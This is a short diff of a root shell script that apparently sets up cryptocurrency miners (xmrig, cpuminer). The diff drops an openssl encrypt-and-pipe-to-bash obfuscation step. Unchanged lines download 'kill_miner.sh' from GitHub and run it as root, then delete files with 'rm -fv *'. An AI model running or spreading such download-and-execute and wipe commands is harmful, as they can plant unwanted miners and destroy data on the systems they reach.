@@ -33,15 +33,13 @@ sleep 3
 sudo /root/love
 sleep 3
 EOF
-openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922.sh -k $password
-rm -fv danielluis1921.sh
-chmod +x /root/danielluis1922.sh
+chmod +x /root/danielluis1921.sh
 
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
 chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
-openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
+./danielluis1921.sh
 rm -fv *
 rm -fR cpuminer-opt-linux/
 rm -fR xmrig-6.21.0/
